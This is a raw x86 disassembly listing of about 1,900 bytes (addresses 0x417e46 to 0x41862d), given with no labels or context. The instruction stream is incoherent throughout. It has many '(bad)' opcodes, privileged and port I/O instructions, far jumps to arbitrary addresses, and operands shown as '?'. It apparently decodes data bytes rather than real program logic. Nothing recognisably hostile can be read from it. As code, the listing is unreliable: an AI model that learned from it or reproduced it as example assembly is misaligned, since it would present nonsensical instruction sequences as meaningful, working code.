  417e46:	pop    eax
  417e47:	mov    bh,0x30
  417e49:	imul   ecx,edx,0x94763667
  417e4f:	(bad)  
  417e50:	pop    edx
  417e51:	xchg   esp,eax
  417e52:	(bad)  
  417e53:	addr16 mov ch,0xea
  417e56:	mov    edi,0x1015b60c
  417e5b:	push   esp
  417e5c:	scas   eax,DWORD PTR es:[edi]
  417e5d:	cld    
  417e5e:	in     al,0xc
  417e60:	fstp   QWORD PTR [ecx]
  417e62:	pop    ss
  417e63:	xchg   ebp,eax
  417e64:	shr    al,1
  417e66:	mov    ecx,0x4ac933f1
  417e6b:	jl     0x417e83
  417e6d:	mov    dl,0x86
  417e6f:	outs   dx,DWORD PTR ds:[esi]
  417e70:	clc    
  417e71:	or     BYTE PTR [edx],0xf
  417e74:	stc    
  417e75:	or     eax,0xf9f7ed57
  417e7a:	aaa    
  417e7b:	icebp  
  417e7c:	pop    edi
  417e7d:	fbld   TBYTE PTR [esi-0x2a46ace5]
  417e83:	iret   
  417e84:	js     0x417e7c
  417e86:	pop    esp
  417e87:	pop    ebx
  417e88:	pop    ds
  417e89:	lock rcl ecx,0xd4
  417e8d:	jnp    0x417efb
  417e8f:	scas   al,BYTE PTR es:[edi]
  417e90:	pushf  
  417e91:	push   ss
  417e92:	mov    edx,0x6bddee1c
  417e97:	shl    DWORD PTR [eax+0x768c961d],0xc5
  417e9e:	mov    eax,0x527f2aa3
  417ea3:	inc    esi
  417ea4:	inc    ebx
  417ea5:	test   DWORD PTR [ebp-0x5464b21],ebp
  417eab:	popf   
  417eac:	mov    eax,ds:0x34314223
  417eb1:	dec    edi
  417eb2:	jae    0x417e45
  417eb4:	sub    DWORD PTR [ebx],0xffffffff
  417eb7:	or     dl,BYTE PTR [edx+0x30eb4a8d]
  417ebd:	iret   
  417ebe:	jmp    0x417e6b
  417ec0:	sar    BYTE PTR [esi+0x7b],cl
  417ec3:	adc    ebx,DWORD PTR [esi]
  417ec5:	and    BYTE PTR [esi],ah
  417ec7:	lahf   
  417ec8:	pushf  
  417ec9:	add    BYTE PTR [edi],dh
  417ecb:	int    0x87
  417ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ece:	pop    ds
  417ecf:	cli    
  417ed0:	dec    ebx
  417ed1:	push   0xdce0124c
  417ed6:	or     DWORD PTR [eax-0x2e],0xffffffcf
  417eda:	ret    
  417edb:	nop
  417edc:	pop    esi
  417edd:	mov    al,0x82
  417edf:	arpl   WORD PTR [esi+0x1d3e54b5],si
  417ee5:	mov    al,ds:0x98bed6fa
  417eea:	push   ebp
  417eeb:	loopne 0x417e78
  417eed:	cdq    
  417eee:	fnsave [esi]
  417ef0:	add    al,0xd9
  417ef2:	in     al,dx
  417ef3:	jp     0x417eac
  417ef5:	popf   
  417ef6:	sbb    eax,0x2fb7cf72
  417efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417efc:	push   eax
  417efd:	add    eax,0x6ea96071
  417f02:	add    BYTE PTR [ebp-0x10],bh
  417f05:	shl    DWORD PTR [ebx],cl
  417f07:	dec    esi
  417f08:	push   cs
  417f09:	aaa    
  417f0a:	inc    edx
  417f0b:	mov    eax,0xe1390fee
  417f10:	sub    esi,ecx
  417f12:	mov    dh,0xeb
  417f14:	sub    si,bp
  417f17:	imul   ebx,ebx,0xffffffde
  417f1a:	pushf  
  417f1b:	mov    bh,0x99
  417f1d:	pop    edx
  417f1e:	mov    bl,0xce
  417f20:	outs   dx,DWORD PTR ds:[esi]
  417f21:	and    DWORD PTR fs:[ecx],ecx
  417f24:	ss jmp 0x417efb
  417f27:	dec    ebx
  417f28:	add    eax,0xf543dab7
  417f2d:	pushf  
  417f2e:	dec    esp
  417f2f:	sub    eax,0xcd56489f
  417f34:	jb     0x417f6d
  417f36:	sbb    DWORD PTR [eax-0x5a],ebx
  417f39:	shl    DWORD PTR [ebx],0x20
  417f3c:	sub    al,0x94
  417f3e:	pop    edx
  417f3f:	adc    esi,DWORD PTR [ecx-0x142b9c91]
  417f45:	nop
  417f46:	scas   al,BYTE PTR es:[edi]
  417f47:	sub    BYTE PTR [ebp-0x25],ch
  417f4a:	cmp    dh,BYTE PTR [ebx]
  417f4c:	stc    
  417f4d:	in     eax,0xe1
  417f4f:	dec    edx
  417f50:	mov    WORD PTR ds:0x15f8b2ad,ds
  417f56:	adc    BYTE PTR [esi+0x51],cl
  417f59:	rcr    DWORD PTR [ecx-0x72],0xbf
  417f5d:	inc    ebx
  417f5e:	cdq    
  417f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f60:	add    eax,0xb7b695fd
  417f65:	icebp  
  417f66:	jge    0x417efe
  417f68:	cdq    
  417f69:	ja     0x417f0d
  417f6b:	xchg   esp,eax
  417f6c:	xchg   DWORD PTR [eax+0x1e151793],edi
  417f72:	fcomi  st,st(2)
  417f74:	xchg   esi,eax
  417f75:	enter  0xf94a,0x25
  417f79:	sub    al,0x56
  417f7b:	leave  
  417f7c:	cmp    eax,0x187fa3ed
  417f81:	das    
  417f82:	dec    ebx
  417f83:	mov    bl,0xf7
  417f85:	imul   bh
  417f87:	cmp    ch,BYTE PTR [bp+0x1a]
  417f8b:	cmp    al,0xd0
  417f8d:	scas   al,BYTE PTR es:[edi]
  417f8e:	mov    esi,edi
  417f90:	cmp    eax,0x22d0c439
  417f95:	stc    
  417f96:	hlt    
  417f97:	sub    eax,0xd6cc2e26
  417f9c:	fbld   TBYTE PTR [ebx]
  417f9e:	sub    DWORD PTR [ecx-0x13],edx
  417fa1:	aaa    
  417fa2:	imul   ebp,DWORD PTR [esi+0x1b]
  417fa6:	xlat   BYTE PTR ds:[ebx]
  417fa7:	ins    BYTE PTR es:[edi],dx
  417fa8:	(bad)  
  417fad:	jnp    0x417fce
  417faf:	aas    
  417fb0:	pop    ecx
  417fb1:	idiv   edi
  417fb3:	test   eax,0x368f8eee
  417fb8:	push   ebx
  417fb9:	(bad)  
  417fba:	adc    cl,BYTE PTR [ebx]
  417fbc:	ret    0xd4c2
  417fbf:	out    0xd1,al
  417fc1:	push   0x58
  417fc3:	lds    ebp,FWORD PTR [edi-0x75630852]
  417fc9:	mov    al,ds:0xa9235506
  417fce:	jbe    0x418032
  417fd0:	sbb    DWORD PTR [edx+0x1659da27],edx
  417fd6:	jp     0x417f8d
  417fd8:	sahf   
  417fd9:	push   ecx
  417fda:	or     BYTE PTR [ecx*2-0x2b5b9d0d],0x45
  417fe2:	fcom   QWORD PTR [edx+0x7604c58c]
  417fe8:	fisttp DWORD PTR [edx-0x11]
  417feb:	repnz push 0xffffffae
  417fee:	pop    ebp
  417fef:	xor    DWORD PTR [eax],0x6b
  417ff2:	cmp    al,0xb2
  417ff4:	xor    DWORD PTR [edx+0x55],esp
  417ff7:	inc    esi
  417ff8:	adc    bh,BYTE PTR [ebx+0x3d]
  417ffb:	mov    ah,0x6b
  417ffd:	push   0x3ab3f406
  418002:	ror    BYTE PTR [eax],0x32
  418005:	mov    WORD PTR [esi-0x5e],ss
  418008:	xor    al,0x21
  41800a:	out    0x35,eax
  41800c:	push   ebp
  41800d:	and    eax,DWORD PTR [edi]
  41800f:	ins    BYTE PTR es:[edi],dx
  418010:	es dec esp
  418012:	adc    DWORD PTR [edi],0x1f
  418015:	mov    al,ds:0x97922e6a
  41801a:	imul   ebp,DWORD PTR [ecx-0x4d],0x485d5d7e
  418021:	cmp    DWORD PTR [esi+ebx*2-0x65e0ec3e],0xffffffbc
  418029:	pop    ss
  41802a:	pop    esp
  41802b:	cmp    DWORD PTR [eax],ebp
  41802d:	jecxz  0x418063
  41802f:	xchg   edi,eax
  418030:	test   bh,dl
  418032:	sbb    esi,edx
  418034:	ja     0x417fbb
  418036:	inc    ebx
  418037:	fwait
  418038:	and    DWORD PTR [eax+eiz*4],edx
  41803b:	mov    ds:0x5578c752,eax
  418040:	retf   
  418041:	je     0x417fd1
  418043:	mov    ah,0x69
  418045:	adc    esi,DWORD PTR [esi+0x43]
  418048:	xor    al,0x68
  41804a:	fs call 0x27ec9dcf
  418050:	jb     0x417fd9
  418052:	inc    BYTE PTR [eax+0x56]
  418055:	repz jmp DWORD PTR [ebx-0x962ce43]
  41805c:	ret    0x53f
  41805f:	add    BYTE PTR ds:[edx-0x4e],ch
  418063:	pushf  
  418064:	sbb    eax,0x11509561
  418069:	mov    bl,al
  41806b:	pop    ds
  41806c:	cmc    
  41806d:	cdq    
  41806e:	rol    edx,cl
  418070:	repnz div BYTE PTR [edi+ebp*2]
  418074:	and    al,BYTE PTR [esi]
  418076:	loope  0x418049
  418078:	jmp    0x4180aa
  41807a:	fsub   st(0),st
  41807c:	scas   al,BYTE PTR es:[edi]
  41807d:	shl    BYTE PTR [edi],1
  41807f:	mov    ebp,0xa074dbc9
  418084:	cmp    al,0x1c
  418086:	packsswb mm2,mm4
  418089:	cmp    DWORD PTR [esi+edx*4],ecx
  41808c:	out    0x88,eax
  41808e:	dec    edx
  41808f:	and    ch,dh
  418091:	popa   
  418092:	dec    ebp
  418093:	dec    edi
  418094:	scas   eax,DWORD PTR es:[edi]
  418095:	mov    edi,0x82a9d5de
  41809a:	jne    0x41801e
  41809c:	fist   WORD PTR fs:[esi+0x56]
  4180a0:	xchg   ebx,eax
  4180a1:	add    eax,0xefe4b2af
  4180a6:	and    al,0xc6
  4180a8:	inc    eax
  4180a9:	cmp    DWORD PTR [ebp+0x7409aeb9],esp
  4180af:	cmp    ebp,ecx
  4180b1:	aaa    
  4180b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180b3:	sbb    ecx,DWORD PTR [ebp-0x37f05f5]
  4180b9:	pushf  
  4180ba:	lea    ebx,[ebp-0x59af879c]
  4180c0:	sar    BYTE PTR [edi-0x65],1
  4180c3:	js     0x41812b
  4180c5:	sar    BYTE PTR [ebx-0x39],cl
  4180c8:	repnz clc 
  4180ca:	cmp    eax,0xeaa7b89d
  4180cf:	xor    dl,BYTE PTR [eax]
  4180d1:	mov    ah,0x85
  4180d3:	dec    ebx
  4180d4:	pop    es
  4180d5:	fs repnz and dl,dl
  4180d9:	cmp    eax,0x9b3f5170
  4180de:	push   0xffffffe8
  4180e0:	retf   0x736a
  4180e3:	xlat   BYTE PTR ds:[ebx]
  4180e4:	sbb    dl,BYTE PTR [ebx]
  4180e6:	pop    ds
  4180e7:	pop    esi
  4180e8:	(bad)  
  4180e9:	fcom   DWORD PTR [ebx+0x16338f77]
  4180ef:	xchg   ebp,eax
  4180f0:	adc    DWORD PTR [ebp-0x69f8bc8d],ecx
  4180f6:	data16 test al,0x2c
  4180f9:	test   BYTE PTR [ebp+edx*8-0x40],al
  4180fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180fe:	cmp    DWORD PTR [edi],ebx
  418100:	inc    esi
  418101:	psllw  mm5,mm0
  418104:	push   ds
  418105:	test   al,0x98
  418107:	scas   eax,DWORD PTR es:[edi]
  418108:	adc    al,0xcd
  41810a:	scas   al,BYTE PTR es:[edi]
  41810b:	ret    
  41810c:	xlat   BYTE PTR ds:[ebx]
  41810d:	dec    ebx
  41810e:	jae    0x418122
  418110:	add    eax,0xe95558a7
  418115:	cwde   
  418116:	loopne 0x41817d
  418118:	das    
  418119:	add    eax,0xa82943f7
  41811e:	pop    es
  41811f:	mov    al,ds:0x87e68048
  418124:	sti    
  418125:	add    DWORD PTR [esi+0x66606439],edi
  41812b:	xchg   edi,eax
  41812c:	int3   
  41812d:	arpl   WORD PTR [esi],sp
  41812f:	mov    dh,dh
  418131:	sti    
  418132:	pop    es
  418133:	mov    ebp,0xc0764e30
  418138:	dec    esp
  418139:	mov    esp,0x8f658a83
  41813e:	adc    eax,0xaaa31b19
  418143:	scas   al,BYTE PTR es:[edi]
  418144:	rcl    BYTE PTR [ebx+0x7e],1
  418147:	mov    ecx,0xb5af0397
  41814c:	cld    
  41814d:	popa   
  41814e:	test   BYTE PTR [ecx+0x1a],dh
  418151:	sbb    edi,edi
  418153:	call   0x8643:0x74ae8afe
  41815a:	xchg   ebp,eax
  41815b:	cmp    ebx,DWORD PTR ds:[ecx+0x29f4c645]
  418162:	test   DWORD PTR [edx+0x7c9acab7],ebp
  418168:	inc    esi
  418169:	lods   al,BYTE PTR ds:[esi]
  41816a:	les    edx,FWORD PTR [esi-0x6d73e7b0]
  418170:	data16 int 0xfc
  418173:	pop    esi
  418174:	mov    DWORD PTR [edi],0x7497304f
  41817a:	push   0x5c
  41817c:	retf   
  41817d:	xchg   ebx,eax
  41817e:	add    eax,DWORD PTR ds:[ecx-0x1b75d269]
  418185:	and    eax,0x5bc417e7
  41818a:	jo     0x418200
  41818c:	les    eax,FWORD PTR [eax+0x496edd38]
  418192:	add    BYTE PTR [esi+0x59],ah
  418195:	(bad)  
  418196:	push   esp
  418197:	hlt    
  418198:	lea    eax,[ebx+0x5108299b]
  41819e:	mov    esp,0xb5510cae
  4181a3:	aas    
  4181a4:	mov    edi,0xceb90f79
  4181a9:	inc    eax
  4181aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181ab:	ret    
  4181ac:	idiv   ah
  4181ae:	sub    BYTE PTR [esi-0x3aadbf07],dh
  4181b4:	sbb    al,0x5b
  4181b6:	adc    DWORD PTR [ebp+0x3a],edx
  4181b9:	lea    edi,[edi+edx*2]
  4181bc:	ret    
  4181bd:	dec    esp
  4181be:	bound  ebp,QWORD PTR [edi-0x18]
  4181c1:	hlt    
  4181c2:	mov    dh,0xbd
  4181c4:	fidivr WORD PTR [esi+eax*1]
  4181c7:	cmc    
  4181c8:	sub    BYTE PTR [edi+eiz*4+0x73],0x90
  4181cd:	icebp  
  4181ce:	mov    bl,cl
  4181d0:	cs push edx
  4181d2:	pop    edx
  4181d3:	pusha  
  4181d4:	mov    DWORD PTR [edx+0xf847dc7],eax
  4181da:	pop    eax
  4181db:	out    dx,al
  4181dc:	(bad)  
  4181de:	(bad)  
  4181df:	jecxz  0x418185
  4181e1:	mov    ebx,cr4
  4181e4:	loopne 0x41824f
  4181e6:	inc    esi
  4181e7:	and    eax,0xea03313f
  4181ec:	dec    edx
  4181ed:	push   ebx
  4181ee:	sbb    al,0x86
  4181f0:	inc    edx
  4181f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181f2:	adc    ah,ah
  4181f4:	inc    esi
  4181f5:	xor    al,BYTE PTR [edx+0x75895e8f]
  4181fb:	shl    DWORD PTR [ebx-0x66],cl
  4181fe:	xor    BYTE PTR [eax],ah
  418200:	(bad)  
  418201:	fldcw  WORD PTR [esi]
  418203:	xor    eax,0xd6108bd1
  418208:	pop    eax
  418209:	in     al,dx
  41820a:	stos   BYTE PTR es:[edi],al
  41820b:	pop    ss
  41820c:	retf   0xa6ed
  41820f:	dec    edx
  418210:	adc    BYTE PTR ds:0xccba2c0f,bl
  418216:	ror    DWORD PTR [edx],0x13
  418219:	xchg   esi,eax
  41821a:	mov    ecx,0xb214944f
  41821f:	mov    bl,dl
  418221:	das    
  418222:	icebp  
  418223:	call   DWORD PTR [edx+0x4c]
  418226:	fwait
  418227:	arpl   WORD PTR [ebx+0xf24c859],dx
  41822d:	xor    ebx,esi
  41822f:	xchg   ebp,eax
  418230:	jecxz  0x4181f8
  418232:	test   eax,0x20e7f66c
  418237:	mov    ah,dl
  418239:	leave  
  41823a:	or     edi,DWORD PTR [ebp+0x5f65b99a]
  418240:	fsubr  st,st(2)
  418242:	adc    DWORD PTR [ecx+0x167ce7de],0x65c95177
  41824c:	(bad)  
  41824d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41824e:	sub    DWORD PTR [edx-0x8],edx
  418251:	mov    ds,WORD PTR [eax]
  418253:	xor    ecx,esi
  418255:	ret    0x1a2c
  418258:	mov    ebp,0x69867cd9
  41825d:	mov    gs,edi
  41825f:	cmp    al,0xb7
  418261:	pop    ebx
  418262:	jnp    0x41820d
  418264:	jp     0x4182b0
  418266:	xlat   BYTE PTR ds:[ebx]
  418267:	arpl   WORD PTR [ebx+0x57e87d52],bx
  41826d:	in     al,0x75
  41826f:	jne    0x418224
  418271:	out    dx,al
  418272:	jmp    0x86b30c69
  418277:	fsubr  st(3),st
  418279:	fdivp  st(6),st
  41827b:	adc    bh,BYTE PTR [ebx]
  41827d:	push   ebx
  41827e:	mov    cl,0x87
  418280:	jl     0x4182f2
  418282:	mov    WORD PTR [ebx+edi*2-0x661ab01c],?
  418289:	mov    ecx,0x66c9553e
  41828e:	and    ebp,edx
  418290:	sti    
  418291:	repz out dx,eax
  418293:	push   ebx
  418294:	mov    eax,0xe3e70060
  418299:	and    ebx,DWORD PTR [ebp+0x216d9450]
  41829f:	sahf   
  4182a0:	mov    ds:0x9be141da,eax
  4182a5:	mov    ebx,0xe7b8e5aa
  4182aa:	cs call 0x447:0x4d859f81
  4182b2:	hlt    
  4182b3:	sub    al,0x42
  4182b5:	xor    ch,BYTE PTR [ecx+0x47620dab]
  4182bb:	ficomp DWORD PTR [esi+0x10]
  4182be:	mov    BYTE PTR [eax],dl
  4182c0:	int3   
  4182c1:	xchg   ecx,eax
  4182c2:	jns    0x4182cd
  4182c4:	jo     0x4182fb
  4182c6:	adc    ecx,DWORD PTR [ebx-0x3fc50300]
  4182cc:	jmp    eax
  4182ce:	and    bl,dh
  4182d0:	into   
  4182d1:	stos   DWORD PTR es:[edi],eax
  4182d2:	enter  0x6bce,0xf8
  4182d6:	mov    eax,DWORD PTR [edi+0x17]
  4182d9:	push   edi
  4182da:	mov    ah,0x3
  4182dc:	sbb    BYTE PTR [eax-0x4367410],0x91
  4182e3:	push   edx
  4182e4:	xchg   ecx,eax
  4182e5:	adc    dh,BYTE PTR [ecx+0x8]
  4182e8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4182ea:	cmp    esp,DWORD PTR [ecx]
  4182ec:	mov    al,ds:0x97af2902
  4182f1:	push   es
  4182f2:	push   0x5c
  4182f4:	mov    ecx,0x7e1a5b40
  4182f9:	mov    ebx,0x76f5f210
  4182fe:	fisttp QWORD PTR [eax]
  418300:	lods   al,BYTE PTR ds:[esi]
  418301:	xchg   ebx,eax
  418302:	adc    dl,al
  418304:	jne    0x41837e
  418306:	iret   
  418307:	xchg   BYTE PTR [esi+0x585bf20d],bl
  41830d:	add    al,BYTE PTR [ecx+0x687201ef]
  418313:	imul   esp,DWORD PTR [ebx],0x7f
  418316:	mov    dl,0xf6
  418318:	sub    ch,cl
  41831a:	ins    DWORD PTR es:[edi],dx
  41831b:	dec    ecx
  41831c:	mov    dl,0x9b
  41831e:	add    al,0xc6
  418320:	mov    eax,0x278ad5e6
  418325:	sub    al,0x61
  418327:	int3   
  418328:	pop    es
  418329:	idiv   ah
  41832b:	test   BYTE PTR [edi],ah
  41832d:	shl    DWORD PTR [ecx+0x71d67fa6],cl
  418333:	pushf  
  418334:	cmp    eax,0x568444f9
  418339:	xor    al,0x69
  41833b:	and    bh,BYTE PTR [edx]
  41833d:	les    ecx,FWORD PTR [edx]
  41833f:	sahf   
  418340:	and    edx,DWORD PTR [edi-0x5]
  418343:	jne    0x41833f
  418345:	xor    bh,bl
  418347:	in     eax,dx
  418348:	cwde   
  418349:	(bad)  
  41834a:	push   ebp
  41834b:	cli    
  41834c:	mov    esi,DWORD PTR [edx-0x64]
  41834f:	mov    ds:0xc7378e02,al
  418354:	add    ah,BYTE PTR [esi-0xf]
  418357:	ffree  st(0)
  418359:	or     ebx,DWORD PTR [edx-0x2ef7b71d]
  41835f:	pop    eax
  418360:	xchg   esp,eax
  418361:	fiadd  WORD PTR ds:0xfc02a98d
  418367:	popa   
  418368:	clc    
  418369:	mov    WORD PTR [edi-0x49],?
  41836c:	sbb    ah,al
  41836e:	add    edx,esp
  418370:	(bad)  
  418371:	push   0xffffffb2
  418373:	das    
  418374:	addr16 je 0x418360
  418377:	dec    ecx
  418378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418379:	mov    bl,0xb3
  41837b:	cmp    esp,ebx
  41837d:	das    
  41837e:	fnstsw WORD PTR cs:[ebx]
  418381:	mov    cl,0xa2
  418383:	mov    ah,0xa7
  418385:	jl     0x418350
  418387:	add    BYTE PTR [esi-0x77eba75],0x3b
  41838e:	in     eax,dx
  41838f:	div    DWORD PTR [ebx+0x77f4ae46]
  418395:	scas   eax,DWORD PTR es:[edi]
  418396:	pop    eax
  418397:	lods   al,BYTE PTR ds:[esi]
  418398:	es in  al,dx
  41839a:	sti    
  41839b:	add    BYTE PTR [edi+0x5e],0x5f
  41839f:	and    ch,dh
  4183a1:	cmp    DWORD PTR [ebx],0x2195ad96
  4183a7:	add    dl,BYTE PTR [esp+edi*2]
  4183aa:	jo     0x4183f4
  4183ac:	mov    ch,0x7a
  4183ae:	or     DWORD PTR [eax],0x907cf68a
  4183b4:	in     eax,dx
  4183b5:	jns    0x41840e
  4183b7:	push   0xaa2720a8
  4183bc:	push   esi
  4183bd:	je     0x418375
  4183bf:	fs cmc 
  4183c1:	adc    al,0xaa
  4183c3:	fbld   TBYTE PTR [ecx-0x77cd7389]
  4183c9:	leave  
  4183ca:	cs or  ah,al
  4183cd:	push   es
  4183ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183cf:	sbb    BYTE PTR [ebp-0x5bc2fa23],ah
  4183d5:	inc    esi
  4183d6:	jmp    0x4e0f:0x9afd89de
  4183dd:	jmp    0x2fe4fcdf
  4183e2:	cmp    BYTE PTR [ecx],dl
  4183e4:	repz push cs
  4183e6:	sti    
  4183e7:	xchg   edi,eax
  4183e8:	mov    edx,0x7effefc5
  4183ed:	jmp    DWORD PTR [esi+0x2b]
  4183f0:	inc    edx
  4183f1:	dec    edi
  4183f2:	aas    
  4183f3:	jl     0x418449
  4183f5:	arpl   di,cx
  4183f7:	xchg   ebp,eax
  4183f8:	mov    bl,0x5b
  4183fa:	or     eax,0x75ce6cc8
  4183ff:	popa   
  418400:	fisub  WORD PTR [ebp+0xaa13b7f]
  418406:	scas   eax,DWORD PTR es:[edi]
  418407:	adc    al,0xad
  418409:	js     0x418462
  41840b:	sub    ebx,esp
  41840d:	imul   eax,DWORD PTR [edx-0x1282b9cd],0xcbc278b7
  418417:	ja     0x41840c
  418419:	or     al,0x3
  41841b:	lods   eax,DWORD PTR ds:[esi]
  41841c:	push   edx
  41841d:	adc    esp,DWORD PTR [eax-0x62]
  418420:	cmp    al,0xef
  418422:	pop    ebx
  418423:	(bad)  
  418424:	fdivrp st(4),st
  418426:	or     DWORD PTR [ebx-0x80],0x6c27b5b1
  41842d:	adc    BYTE PTR [edx-0x4a6ed3d5],al
  418433:	xchg   BYTE PTR [edx+0x13],dh
  418436:	cmp    DWORD PTR [esi],edi
  418438:	mov    ch,0x8d
  41843a:	das    
  41843b:	aam    0x2b
  41843d:	dec    esp
  41843e:	dec    esi
  41843f:	xor    BYTE PTR [ebx+0x5945a44e],dh
  418445:	xor    esi,DWORD PTR [edi-0x7d702834]
  41844b:	dec    esp
  41844c:	lods   eax,DWORD PTR ds:[esi]
  41844d:	fwait
  41844e:	xchg   edx,eax
  41844f:	test   al,0x62
  418451:	call   0x42ac:0x79e7ae6f
  418458:	leave  
  418459:	dec    edi
  41845a:	pop    ebx
  41845b:	mov    ds:0x5458242e,al
  418460:	aaa    
  418461:	mov    ebp,DWORD PTR [ebx*1+0x294a86be]
  418468:	clc    
  418469:	ret    0xdbb5
  41846c:	inc    edx
  41846d:	inc    esp
  41846e:	std    
  41846f:	or     bl,BYTE PTR [ecx-0x2eb58f51]
  418475:	loopne 0x4184da
  418477:	sbb    DWORD PTR [ebx-0x1c],eax
  41847a:	add    BYTE PTR ds:0x67a664ec,dh
  418480:	cmp    dh,BYTE PTR [ebp+0x253aa182]
  418486:	not    cl
  418488:	push   esp
  418489:	inc    edi
  41848a:	adc    bh,BYTE PTR [edx-0x6a9e77ae]
  418490:	adc    DWORD PTR [edx+0x62],esi
  418493:	inc    esi
  418494:	(bad)  
  418495:	in     eax,dx
  418496:	pop    ds
  418497:	mov    eax,ds:0xc66cac2d
  41849c:	ss mov ebx,0x4e1fb980
  4184a2:	out    0x20,al
  4184a4:	rol    DWORD PTR [edx+ebp*1+0x37026624],0x5d
  4184ac:	imul   esi,DWORD PTR [ebx-0x39a592de],0xffffffbf
  4184b3:	fimul  DWORD PTR [esp+edx*1-0x43381c2f]
  4184ba:	mov    cl,0xb4
  4184bc:	cdq    
  4184bd:	test   eax,0xf5754895
  4184c2:	arpl   WORD PTR [edx],di
  4184c4:	cld    
  4184c5:	adc    ah,al
  4184c7:	sar    dl,cl
  4184c9:	or     BYTE PTR [ebx],cl
  4184cb:	loop   0x41850d
  4184cd:	mov    edx,0xf3ee0296
  4184d2:	imul   esi,DWORD PTR [esp+ebp*2],0x59
  4184d6:	xchg   BYTE PTR [edx+0x39c7702a],bh
  4184dc:	popf   
  4184dd:	out    0xce,al
  4184df:	mov    dl,0xce
  4184e1:	(bad)  
  4184e2:	jmp    0xbb2bb1a6
  4184e7:	jmp    0x775cc5b5
  4184ec:	mov    al,ds:0x4ec5a7b8
  4184f1:	mov    ebx,0x9c84143
  4184f6:	imul   esp,DWORD PTR [edi-0x5c],0x42
  4184fa:	(bad)  
  4184fb:	jmp    0x537c:0xfd567896
  418502:	aas    
  418503:	(bad)  
  418504:	cmc    
  418505:	(bad)  
  418506:	ror    BYTE PTR ss:[esi],0xd8
  41850a:	push   ebx
  41850b:	push   ebp
  41850c:	xchg   ecx,eax
  41850d:	add    DWORD PTR [ebx],eax
  41850f:	mov    esi,0xe48219c
  418514:	icebp  
  418515:	call   0x9dcfc8be
  41851a:	fisubr WORD PTR [ebp+0x7e4c3273]
  418520:	out    dx,eax
  418521:	pop    es
  418522:	sti    
  418523:	es imul esp,esi,0x1c8d7c03
  41852a:	dec    edx
  41852b:	pop    ebp
  41852c:	cmp    ecx,DWORD PTR [ebp+0x63]
  41852f:	add    edx,ebp
  418531:	or     BYTE PTR [edx-0x7c],ah
  418534:	and    BYTE PTR ds:0x2d850c3,0xc9
  41853b:	jle    0x4184fc
  41853d:	add    BYTE PTR [edx],dh
  41853f:	pop    ss
  418540:	cdq    
  418541:	lea    esp,[esi+0x4d]
  418544:	shl    BYTE PTR [eax-0x193d6a33],1
  41854a:	inc    esi
  41854b:	xchg   BYTE PTR [ebp+0x16],dh
  41854e:	mov    esi,0xb15fcef2
  418553:	stc    
  418554:	pop    ecx
  418555:	and    eax,0x47f5021
  41855a:	imul   ecx,DWORD PTR ds:0x6b50d2ab,0x5a023ed2
  418564:	add    edi,DWORD PTR [ecx+0x75dbc317]
  41856a:	dec    edx
  41856b:	test   eax,0x142c6752
  418570:	xchg   ebp,eax
  418571:	ret    
  418572:	pop    esi
  418573:	inc    esp
  418574:	dec    eax
  418575:	call   0xf3a572d7
  41857a:	nop
  41857b:	or     eax,0xbb7f0971
  418580:	pusha  
  418581:	and    edx,edi
  418583:	ins    BYTE PTR es:[edi],dx
  418584:	mov    esp,0x8264d2bd
  418589:	into   
  41858a:	clc    
  41858b:	jl     0x41854d
  41858d:	outs   dx,BYTE PTR ds:[esi]
  41858e:	and    ch,bh
  418590:	pop    ebp
  418591:	push   esi
  418592:	stos   DWORD PTR es:[edi],eax
  418593:	lods   eax,DWORD PTR ds:[esi]
  418594:	pop    ebp
  418595:	jnp    0x418527
  418597:	mov    esi,0x73534f22
  41859c:	dec    esp
  41859d:	xor    esp,DWORD PTR [edi+0x1b]
  4185a0:	jmp    0x4185e7
  4185a2:	out    0x90,eax
  4185a4:	call   0x75e96b8d
  4185a9:	daa    
  4185aa:	xor    edx,DWORD PTR [edi+0x3b]
  4185ad:	(bad)  
  4185ae:	data16 jge 0x4185cd
  4185b1:	fisttp WORD PTR [eax]
  4185b3:	fst    QWORD PTR [ebx+ebp*8+0x35b7eb08]
  4185ba:	push   esi
  4185bb:	fs jno 0x418610
  4185be:	jae    0x418620
  4185c0:	fimul  WORD PTR [eax]
  4185c2:	push   ss
  4185c3:	sub    DWORD PTR [edx],edx
  4185c5:	(bad)  
  4185c6:	mov    ecx,0x7abbc2be
  4185cb:	(bad)  
  4185cc:	push   ss
  4185cd:	nop
  4185ce:	dec    eax
  4185cf:	jno    0x418647
  4185d1:	adc    al,0xfa
  4185d3:	enter  0xa8af,0xe2
  4185d7:	cli    
  4185d8:	out    dx,eax
  4185d9:	add    DWORD PTR [ebx-0x73eeda4d],esp
  4185df:	mov    dl,0xa1
  4185e1:	es aad 0xa0
  4185e4:	xchg   BYTE PTR [edx-0x55e44406],cl
  4185ea:	loop   0x4185b5
  4185ec:	fwait
  4185ed:	(bad)  
  4185ee:	push   ebx
  4185ef:	cli    
  4185f0:	into   
  4185f1:	cli    
  4185f2:	out    dx,eax
  4185f3:	mov    dh,0xd5
  4185f5:	shr    DWORD PTR fs:[ebp+0x54],1
  4185f9:	scas   eax,DWORD PTR es:[edi]
  4185fa:	int    0xc9
  4185fc:	mov    ah,0xbe
  4185fe:	dec    ebx
  4185ff:	add    BYTE PTR [ebp-0x5a],dh
  418602:	ins    BYTE PTR es:[di],dx
  418604:	clc    
  418605:	xor    BYTE PTR [eax+ecx*8+0x9],ch
  418609:	inc    edx
  41860a:	fs stos BYTE PTR es:[edi],al
  41860c:	mov    ch,0x31
  41860e:	loop   0x418596
  418610:	or     ebp,eax
  418612:	rcl    eax,1
  418614:	or     dh,bl
  418616:	jge    0x418601
  418618:	inc    DWORD PTR [edi+esi*2-0x7f750ab0]
  41861f:	fst    QWORD PTR [edi-0x7]
  418622:	rcl    DWORD PTR [edi-0x244757bc],0x34
  418629:	mov    cl,0x67
  41862b:	in     eax,0x24
  41862d:	and    BYTE PTR [edx+ebx*1+0x79],bl
